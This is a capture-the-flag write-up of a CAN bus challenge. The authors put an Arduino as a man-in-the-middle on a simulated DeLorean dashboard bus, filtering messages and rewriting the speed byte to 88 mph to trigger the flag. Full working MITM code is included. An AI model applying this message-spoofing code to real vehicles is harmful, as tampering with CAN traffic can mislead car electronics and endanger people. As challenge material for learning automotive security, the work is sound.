# Back to the future, CAN, 250pts

> Our intelligence suggests that the DeLorean we previously recovered is capable of time travel.
According to the documents in our possession the time travel functionality is activated as soon as a specific ECU within the vehicle maintains a velocity of exactly 88 miles per hour for at least a few seconds. We rely on your CAN bus expertise to trick the time-travel ECU into thinking it is travelling at the right speed; again, the vehicle dashboard we restored should be of use.

> Best of luck.

> The Dashboard app is available here.

> Challenge developed by Argus Cyber Security.

In this task we were supposed to make the car believe it travels
at 88MPH. Again, the setup is such that the MCU sends CAN messages
using one of its interfaces, then receives them using the other one,
probably to simulate full CAN bus with multiple devices.

After a bit of sniffing the bus, we identified one of the messages that
seemed to be correlated with dashboard's speed display. But how to
change the byte responsible for the speed? Well, the simplest answer
we came up with, was to man-in-the-middle the bus.

We cut the traces connecting both CAN controllers, then connected
them to Arduino with two MCP2515 chips. Its code was quite
simple: when received message on one interface, forward it
to the other one. After verifying the dashboard still works fine,
we modified the code to change the speed to 88 when detected
appropriate CAN id.

Unfortunately, for some reason the flag wasn't showing up. Instead, 
we were getting "check engine" indicator on the dashboard.
After some admittedly random changes, we made the Arduino forward
only two particular types of messages. Most of the dashboard died
(the temperature and most of the indicators were at zero), but
the speed remained 88MPH. After a few seconds, the flag showed up.

Final MITM code:
```cpp
#include <mcp_can.h>
#include <SPI.h>
#include <avr/pgmspace.h>

// the cs pin of the version after v1.1 is default to D9
// v0.9b and v1.0 is default D10
const int SPI_CS_PIN = 9;
const int SPI_CS_2 = 5;

MCP_CAN CAN2(SPI_CS_2); 
MCP_CAN CAN(SPI_CS_PIN); 

unsigned char len = 0;
unsigned char buf[8];

void mitm(MCP_CAN& CAN, MCP_CAN& CAN2) {
      if(CAN_MSGAVAIL == CAN.checkReceive()){
        CAN.readMsgBuf(&len, buf);    // read data,  len: data length, buf: data buf

        unsigned int canId = CAN.getCanId();
        
        Serial.println("-----------------------------");
        Serial.print("Get data from ID: ");
        Serial.println(canId, HEX);

        for(int i = 0; i<len; i++)    // print the data
        {
            Serial.print(buf[i], HEX);
            Serial.print(" ");
        }
        Serial.println();
        if (canId == 0x23) {
           buf[1] = 88; 
           CAN2.sendMsgBuf(canId, 0, len, buf);
        }
        else if (canId == 0x19a) {
           CAN2.sendMsgBuf(canId, 0, len, buf);
        }
        
      }
}

void setup()
{
    Serial.begin(115200);

    while (CAN_OK != CAN.begin(CAN_50KBPS, MCP_8MHz)) {
        Serial.println("CAN BUS Shield init fail");
        Serial.println(" Init CAN BUS Shield again");
        delay(100);
    }while (CAN_OK != CAN2.begin(CAN_50KBPS, MCP_8MHz)) {
        Serial.println("CAN2222 BUS Shield init fail");
        Serial.println(" Init CAN2222 BUS Shield again");
        delay(100);
    }
    Serial.println("CAN BUS Shield init ok!");
    while (1) {
      mitm(CAN, CAN2);
      mitm(CAN2, CAN);
    }
}

void loop(){}
```